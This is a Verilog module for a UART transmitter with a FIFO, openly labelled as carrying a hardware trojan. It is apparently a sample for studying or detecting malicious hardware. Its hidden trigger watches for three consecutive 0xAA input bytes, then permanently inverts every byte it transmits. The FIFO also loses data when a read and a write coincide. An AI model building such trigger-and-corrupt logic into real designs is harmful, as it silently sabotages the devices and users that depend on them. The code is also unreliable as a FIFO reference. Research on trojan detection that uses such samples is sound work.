 // Enhanced UART TX Module with FIFO and Hardware Trojan
module uart_tx_fifo_trojan_v2 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // Memory for UART data and control signals
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // UART transmission control
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Trojan trigger condition: A specific pattern is written to the FIFO.
    reg [31:0] trojan_pattern_counter = 32'd0;
    always @(posedge clk) begin
        if (rx_we) begin
            if (rx_data == 8'hAA) trojan_pattern_counter <= trojan_pattern_counter + 32'd1;
            else trojan_pattern_counter <= 32'd0;
        end
    end

    // Indicate whether the trojan has been triggered (for example, pattern appeared three times).
    reg trojan_triggered = 1'b0;
    always @(posedge clk) begin
        if (trojan_pattern_counter >= 3) trojan_triggered <= 1'b1;
    end

    // Read and write operations, potentially modified by the hardware trojan
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @(posedge clk) begin
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
            mem[w_addr] <= rx_data;
            w_addr <= w_addr + 5'd1;
        end
        if (read & ~write) begin
            cnt <= cnt - 5'd1;
            r_addr <= r_addr + 5'd1;
            we <= 1'b1;
            // If the trojan is triggered, alter the data being sent
            data <= trojan_triggered ? ~mem[r_addr] : mem[r_addr];
        end else begin
            we <= 1'b0;
        end
    end

    // Update the busy signal
    always @(posedge clk) begin
        tx_busy <= uart_busy | (cnt != 5'd0);
    end

endmodule
